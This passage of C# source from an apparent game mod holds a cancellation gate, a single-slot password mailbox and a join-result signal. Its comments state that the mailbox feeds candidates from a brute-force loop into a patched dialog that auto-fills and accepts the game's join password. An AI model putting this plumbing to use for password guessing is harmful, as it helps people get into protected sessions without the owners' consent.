            // "Running" means we have a CTS and it hasn't been canceled.
            public static bool IsRunning => CancelSource != null && !CancelSource.IsCancellationRequested;

            /// <summary>
            /// Attempt to begin a run. If already running, returns false and a default token.
            /// Otherwise creates a fresh CTS and returns its token.
            /// </summary>
            public static bool TryBegin(out CancellationToken token)
            {
                lock (_gate)
                {
                    if (IsRunning)
                    {
                        token = default;
                        return false;
                    }

                    // Dispose any stale CTS (e.g., previous run that finished but wasn't cleaned).
                    CancelSource?.Dispose();

                    // Create a fresh CTS for the new run.
                    CancelSource = new CancellationTokenSource();
                    token = CancelSource.Token;
                    return true;
                }
            }

            /// <summary>
            /// Request cancellation of the active run (no-op if none).
            /// Safe to call multiple times (idempotent).
            /// </summary>
            public static void RequestCancel()
            {
                lock (_gate)
                {
                    CancelSource?.Cancel();
                }
            }

            /// <summary>
            /// Final cleanup after a run: dispose and null CTS.
            /// Call this from the worker's finally block to avoid leaks.
            /// </summary>
            public static void Cleanup()
            {
                lock (_gate)
                {
                    CancelSource?.Dispose();
                    CancelSource = null;
                }
            }
        }

        /// <summary>
        /// Tiny, single-slot handoff used to pass a password from background logic
        /// (e.g., a brute-force loop) to a UI hook/patch that will auto-fill and
        /// auto-accept the game's password dialog.
        ///
        /// Pattern:
        ///   1) Producer calls Set(candidate);
        ///   2) UI patch (Prefix) calls TryConsume(out pwd) and, if true, injects it
        ///      into the dialog controls and simulates "OK".
        ///
        /// Notes:
        /// - This is a one-time mailbox: reading consumes the value.
        /// - "Last write wins": if Set(...) is called twice before a consumer reads,
        ///   only the most recent value will be taken.
        /// - Not thread-safe by design (kept minimal). If you need cross-thread
        ///   safety under contention, consider Interlocked.Exchange instead.
        /// </summary>
        public static class KnownPasswordProvider
        {
            // Single-slot buffer holding the next password to auto-apply.
            // Null/empty means "no password queued".
            private static string _nextPassword;

            /// <summary>
            /// Queue a password for the very next password prompt.
            /// Overwrites any previously queued value (last write wins).
            /// </summary>
            public static void Set(string password)
            {
                _nextPassword = password; // last write wins (no locking)
            }

            /// <summary>
            /// Attempt to take (and clear) the queued password.
            /// Returns true only if a non-empty password was available.
            ///
            /// Side effect: always clears the internal slot (consume-on-read).
            /// </summary>
            public static bool TryConsume(out string password)
            {
                password = _nextPassword; // Read current value.
                _nextPassword = null;     // Clear so it won't be reused.
                return !string.IsNullOrEmpty(password);
            }
        }

        // A tiny helper that lets us "await" the game's built-in join verdict.
        // We arm it before we initiate a join, and complete it from the game's
        // JoinCallback (patched below). This avoids fragile polling.
        internal static class JoinSignal
        {
            // Captures the next join attempt's result (true/false + message).
            private static TaskCompletionSource<(bool ok, string msg)> _tcs;

            /// <summary>
            /// Prepare a fresh completion source for the upcoming join.
            /// Call this immediately before invoking the game's join method.
            /// </summary>
            public static void Arm()
            {
                _tcs = new TaskCompletionSource<(bool, string)>(
                    TaskCreationOptions.RunContinuationsAsynchronously); // Don't inline continuations onto the signaler's thread.
            }

            /// <summary>
            /// Resolve the pending waiters with the game's join result.
            /// This is called from our Harmony postfix on FrontEndScreen.JoinCallback.
            /// </summary>
            public static void Complete(bool ok, string message)
            {
                _tcs?.TrySetResult((ok, message ?? string.Empty));
            }

            /// <summary>
            /// Wait (with timeout/cancellation) for the armed join to complete.
            /// Returns (false, "...") if cancelled or timed out.
            /// </summary>
            public static async Task<(bool ok, string msg)> WaitAsync(
                TimeSpan timeout,
                CancellationToken cancel)
            {
                using (var cts = CancellationTokenSource.CreateLinkedTokenSource(cancel))
                {
                    cts.CancelAfter(timeout);              // enforce a max wait
                    var t = _tcs?.Task ?? Task.FromResult((false, "Join not armed."));

                    // If we hit timeout/cancel, cancel the TCS and swallow exceptions,
                    // returning a simple (false, "...") result.
                    using (cts.Token.Register(() => _tcs?.TrySetCanceled()))
                    {
                        try   { return await t.ConfigureAwait(false); }
                        catch { return (false, "Join wait cancelled/timeout."); }
                    }
                }
            }
        }
        #endregion
    }
}